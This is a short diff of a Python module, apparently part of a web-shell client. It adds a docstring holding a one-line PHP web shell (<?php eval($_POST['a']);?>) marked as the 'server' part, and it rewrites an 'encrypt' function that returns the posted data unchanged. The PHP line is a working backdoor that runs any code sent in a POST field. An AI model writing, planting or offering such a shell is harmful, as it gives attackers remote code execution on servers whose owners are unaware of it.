@@ -1,5 +1,10 @@
 # coding=utf-8
 
+"""
+server:
+<?php eval($_POST['a']);?>
+"""
 
-def encrypt(functional_code):
-    return functional_code
+
+def encrypt(postdata, pwd):
+    return postdata
